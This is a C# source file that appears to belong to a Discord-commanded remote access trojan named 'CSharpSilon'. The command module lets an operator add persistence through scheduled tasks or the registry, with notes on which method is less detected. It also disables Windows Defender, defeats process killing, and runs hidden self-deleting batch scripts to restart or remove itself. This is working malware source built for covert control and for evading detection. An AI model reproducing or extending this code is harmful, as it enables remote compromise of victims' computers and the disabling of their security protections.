using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Discord.Commands;
using CSharpSilon.Utils;

namespace CSharpSilon.cmds
{
    public class App : ModuleBase<SocketCommandContext>
    {
        [Command("admin"), Summary("A Command To See If The Client Has Admin Privledges On The User's Machine")]
        public async Task Admin()
        {
            await ReplyAsync($"I Currently: {(Utils.App.IsAdmin() ? "Do" : "Do Not")} Have Admin Permissions").ConfigureAwait(false);
        }

        [Command("schtask"), Summary("Adds Or Removes The Bot Form Startup Using Scheduled Tasks. Less Detected.")]
        public async Task SchTaskStartup()
        {
            if (schtasks.GetStartup())
            {
                schtasks.DelStartup();
                await ReplyAsync("Removed From Schtask Startup");
            }
            else
            {
                await ReplyAsync("Added To Schtask Startup");
                schtasks.HandleStartup();
            }
        }

        [Command("startup"), Summary("Adds Or Removes The Bot Form Startup Using Registry. More Detected.")]
        public async Task NormalStartUp()
        {
            if (NormalStartup.GetStartup())
            {
                NormalStartup.DelStartup();
                await ReplyAsync("Removed From Registry Startup");
            }
            else
            {
                await ReplyAsync("Added To Registry Startup");
                NormalStartup.HandleStartup();
            }
        }

        [Command("disable-defender"), Alias("dd"), Summary("Disables Defender, But Require's The App To Have Administrator Privledges")]
        public async Task DisableDefender()
        {
            Defender.Run();
            await ReplyAsync("Defender Disabled.");
        }

        [Command("end"), Alias("exit", "close"), Summary("Closes The Bot's Process")]
        public async Task Kill()
        {
            await ReplyAsync("Closing..");
            AntiKill.Disable();
            Process.GetCurrentProcess().Kill();
            Environment.Exit(0);
        }
        
        [Command("ping"), Summary("Returns The Bot's Latency")]
        public async Task Ping()
        {
            var latency = Context.Client.Latency; // Get the bot's latency
            await ReplyAsync($"Ping: {latency}ms");
        }
        
        

        [Command("uninstall"), Summary("Uninstalls The Bot")]
        public async Task Uninstall()
        {
            var currentFile = System.Reflection.Assembly.GetExecutingAssembly().Location;
            var batFilePath = Path.Combine(Path.GetTempPath(), Path.GetTempFileName()+".bat");
            var csFolderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "cs");

            using (var sw = new StreamWriter(batFilePath))
            {
                sw.WriteLine("@echo off");
                sw.WriteLine("timeout /t 3 /nobreak > nul");
                sw.WriteLine($"rmdir /s /q \"{csFolderPath}\"");
                sw.WriteLine($"del \"{currentFile}\" /f /q");
                sw.WriteLine($"del \"{batFilePath}\" /f /q");
            }

            Process.Start(new ProcessStartInfo
            {
                FileName = batFilePath,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
            });

            await ReplyAsync("Uninstalling... The bot will be removed in 3 seconds.");
            AntiKill.Disable();
            Environment.Exit(0);
        }
        
        [Command("restart"), Summary("Restarts the bot")]
        public async Task Restart()
        {
            var currentFile = System.Reflection.Assembly.GetExecutingAssembly().Location;
            var batFilePath = Path.Combine(Path.GetTempPath(), Path.GetTempFileName()+".bat");

            using (var sw = new StreamWriter(batFilePath))
            {
                sw.WriteLine("@echo off");
                sw.WriteLine("timeout /t 3 /nobreak > nul");
                sw.WriteLine($"powershell -windowstyle hidden -command \"& Start-Process -FilePath '{currentFile}' -NoNewWindow\"");
                sw.WriteLine($"del \"{batFilePath}\" /f /q");
            }
            
            Process.Start(new ProcessStartInfo
            {
                FileName = batFilePath,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            });

            await ReplyAsync("Restarting... The Bot Will Be Back On In 3 Seconds.");
            AntiKill.Disable();
            Environment.Exit(0);
        }

        [Command("checktoken")]
        public async Task CheckToken(string token)
        {
            await ReplyAsync(IsBotTokenValid(token).Result.ToString());
        }
        
        public async Task<bool> IsBotTokenValid(string token)
        {
            using (var httpClient = new HttpClient())
            {
                var request = new HttpRequestMessage(HttpMethod.Get, "https://discord.com/api/v9/users/@me")
                {
                    Headers =
                    {
                        { "Authorization", $"Bot {token}" }
                    }
                };

                var response = await httpClient.SendAsync(request);
                return response.IsSuccessStatusCode;
            }
        }

        
    }
}